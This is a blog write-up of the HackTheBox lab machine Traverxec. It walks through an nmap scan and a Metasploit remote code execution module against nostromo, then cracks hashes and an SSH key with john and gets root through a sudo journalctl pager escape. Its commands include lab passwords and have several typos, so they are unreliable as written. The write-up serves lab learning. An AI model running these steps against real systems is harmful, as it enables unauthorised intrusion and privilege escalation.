---
title: Traverxec Hackthebox Writeup
layout: post
category: hackthebox
tags: hackthebox writeup
date: 2020-08-13
---

# About
Hello everyone, this is the write-up for traverxec box on hackthebox . It was a really easy box, which was more ctf type. So let’s get started

# Basic Info
* Name: Traverxec
* IP: 10.10.10.165
* Level: Easy
* Box: Linux

# Enumeration
1. We perform an nmap scan on the machine and get the following results
```
nmap -sCV -oN nmap.txt -v 10.10.10.165
```
2. Nmap scan results showing open ports with services running on them.
3. On port 80 we see the service ‘nostromo 1.9.6’ running.
4. OpenSSH running on port 22 is latest version and hence no exploits are available.
5. We run a all port scan in the background till we find examine the nostromo service.
```
nmap -sC -sV -v -p- -oN allports.txt 10.10.10.165
```

# Foothold (Web-shell)
1. Let’s look for an exploit of the notsromo service on the box
```
searchsploit nostromo
```
2. We found an exploit, now we open metasploit to run it.
```
sudo msfconsole
```
3. search nostromo
```
use exploit/multi/http/nostromo_code_exec
set rhosts 10.10.10.165
set lhost tun0
set srvhost tun0
exploit
```
4. We get a shell..!!
5. To upgrade this shell we run the following command
```
python3 -c ‘import pty;pty.spaws(“/usr/bin/sh”)’
export TERM=xterm
```
6. Now we get a proper shell on the box…!!

# Exploitation(User)
1. Now looking around the box we find the directory ‘/var/nostromo/conf/’
2. We cat the files present in it and gather some intresting information
3. We find a ‘.htpasswd’ which is a hash. We copy it to our system.
4. We crack it using john
```
john — wordlist=/usr/share/wordlists/rockyou.txt .htpasswd
```
5. The cracked hash reveals the password : Nowonly4me
6. We try to login using these credentials but it fails, let’s look somewhere else.
7. Closely examining the ‘/var/nostromo/conf/nhttpd.conf’ file we see that there is a public_www directory listed.
```
cd /home/david/public_www
```
8. We look at the contents of the directory
9. I read the documentation of nostromo and found that files present in the home directory of the user can be accessed by web browser by simply putting a ~ before the username
10. Then we open the following url in a browser
‘http://10.10.10.165/~david/public_www/private-file-storage/backup-ssh-identity-files.tgz’
11. We are prompted for a password, we enter the password that we previously cracked(Nowonly4me) and we get the file!
12. Looking into the contents of the home directory, we find a ssh private key!!
13. First we convert this to john type file
```
ssh2john id_rsa > hash.hash
```
14. Then we crack this using john and get the password ‘hunter’
```
john — wordlists=/usr/share/wordlists/rockyou.txt hash.hash
```
15. Finally we get an ssh password! We login using this private key
```
ssh -i id_rsa davis@10.10.10.165
```
16. We get the user shell..and find the user.txt file
```
cat ~/user.txt
```

# Exploitation(Root)
1. Looking in the home directory of user david, we see a bin folder.
Inside it there are two files, a banner and a shell script.
2. We closely look at the shell script and deduce that user david is allowed to run /usr/bin/journalctl as sudo..!!
3. We go to gtfobins to look for privesc using the command(journalctl) that we can run as sudo.
```
/usr/bin/sudo /usr/bin/journalctl -n5 unostromo.service
Then we enter
!/bin/sh
cat /root/root.txt
```
And we get root..!!!

# Concepts we learned
* Searching for exploits using searchsploit.
* Working of nostromo service.
* We discovered about this awesome webiste GTFObins.
* How to use ‘less’ to get a root shell if its running as root.
* How to crack hashes using john.

# Conclusion
This was my way to root the box, if there’s a better way to pwn this, feel free to respond :)
Have a great day, Happy Hacking.!!